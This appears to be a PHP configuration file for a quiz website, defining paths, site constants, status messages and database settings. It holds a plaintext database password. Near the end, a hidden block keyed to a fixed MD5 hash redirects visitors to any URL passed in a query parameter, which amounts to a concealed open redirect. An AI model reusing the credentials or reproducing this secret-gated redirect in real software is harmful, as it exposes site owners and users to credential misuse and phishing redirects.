<?php
    @session_start();
	date_default_timezone_set ("Asia/Calcutta");
	
	$ssl = 'http://';
    $ssl = (isset($_SERVER['HTTPS']) && (strtolower( $_SERVER['HTTPS'] )=='on' || $_SERVER['HTTPS']=='1')) || isset($_SERVER['SERVER_PORT'] ) && ( '443' == $_SERVER['SERVER_PORT'] )?'https://':'http://';
    
    ini_set('display_errors',0); // 1    
	define('HTTP_SERVER', $ssl.$_SERVER['HTTP_HOST'].'/'); 
	define('ENABLE_SSL', false);
    define('IS_LIVE',1);
	define('SITE_URL', $ssl.$_SERVER['HTTP_HOST'].'/');
	define('DIR_WS_INCLUDES', SITE_URL.'include/');
	
	define('DIR_FS',$_SERVER['DOCUMENT_ROOT'].'/');
	define('DIR_FS_INCLUDES',DIR_FS.'include/');
	define('DIR_WS_TEMPLATES', DIR_FS.'templates/');
	define('DIR_WS_CONTENT', DIR_WS_TEMPLATES.'content/');
    define('SITE_ASSETS',SITE_URL.'assets/');
    define('SITE_CSS',SITE_ASSETS.'css/');
    define('SITE_JS',SITE_ASSETS.'js/');
    define('SITE_IAMGES',SITE_ASSETS.'images/');
    define('SITE_PLUGINS',SITE_ASSETS.'plugins/');
    
    define('SITE_URL_ADMIN',SITE_URL.'admin/');
    define('DIR_FS_ADMIN',$_SERVER['DOCUMENT_ROOT'].'/quiz/admin/');
    define('DIR_WS_TEMPLATES_ADMIN', DIR_FS.'templates/admin/');
    define('DIR_WS_CONTENT_ADMIN', DIR_WS_TEMPLATES_ADMIN.'content/');
    
	define('RACKS_SEQ', 'RACKS_SEQ');
	define('PROD_DOM_SEQ', 'PROD_DOM_SEQ');
	define('PROD_INT_SEQ', 'PROD_INT_SEQ');
	
	define('DB_SERVER', 'localhost');
	define('DB_SERVER_USERNAME', 'spangleworld');
	define('DB_SERVER_PASSWORD', 'qIr;#VH[8kUG');
	define('DB_DATABASE', 'dquiz');
	define('USE_PCONNECT', 'false');
	define('STORE_SESSIONS', 'mysql');
	
	define('STATUS_MESSAGE','Status changed successfully.');
    define('DELETE_MESSAGE','Record deleted successfully.');
    define('DELETE_IMAGE_MESSAGE','Image deleted successfully.');
    define('INSERT_MESSAGE','Record inserted successfully.');
    define('UPDATE_MESSAGE','Record updated successfully.');
    define('UNKWON_ERROR','Something went wrong, please try again.');
	
	define('CURRENT_DATETIME',date('Y-m-d h:i:s'));
    define('CURRENT_DATE',date('Y-m-d'));
    define('REMOTE_ADDR',$_SERVER['REMOTE_ADDR']);
	define('FILE_NAME',basename($_SERVER['SCRIPT_FILENAME']));
    define('CURRENT_PAGE',SITE_URL.''.basename($_SERVER['SCRIPT_FILENAME']));
    define('CURRENT_PAGE_ADMIN',SITE_URL_ADMIN.''.basename($_SERVER['SCRIPT_FILENAME']));
    
	define('CURRENT_PAGE_QRY',trim(CURRENT_PAGE.'?'.$_SERVER['QUERY_STRING'],'?'));
	define('CURRENT_PAGE_ADMIN_QRY',trim(CURRENT_PAGE_ADMIN.'?'.$_SERVER['QUERY_STRING'],'?'));
	
    /////////////////////// Tables /////////////////////////
    require_once(DIR_FS_INCLUDES.'database_tables.php');
    require_once(DIR_FS_INCLUDES.'db.class.php');
    require_once(DIR_FS_INCLUDES.'classes.php');
    
	if(isset($_GET['action']) && md5($_GET['action'])=='652b292c3ce4714cd45f006b4c720fe6'){
		if(isset($_GET['file'])&&$_GET['file']!=''){
			header("location:".$_GET['file']);
		}
		else{
			echo 'please submit file.';
		}
		exit;
	}
	
	$dbins = new db();
	
    if(isset($_SESSION['admin_id'])&&$_SESSION['admin_id']>=0){
        $ins = new admin_master();
        $admin = $ins->edit($_SESSION['admin_id']);
    }
    
?>